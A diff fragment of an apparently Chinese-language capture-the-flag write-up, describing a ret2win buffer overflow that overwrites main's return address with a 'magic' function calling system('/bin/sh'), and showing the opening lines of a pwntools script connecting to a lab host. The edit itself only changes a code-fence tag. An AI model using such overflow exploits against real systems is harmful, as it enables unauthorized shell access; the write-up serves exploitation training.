@@ -1,7 +1,7 @@
 發現有一個 magic 函式，裡面有`system('/bin/sh')`
 利用 BOF 把 main 裡面的 ret 位置 蓋成 magic 的位置即可
 
-```python=
+```python
 from pwn import *
 
 p = remote('10.140.0.8', 11111)
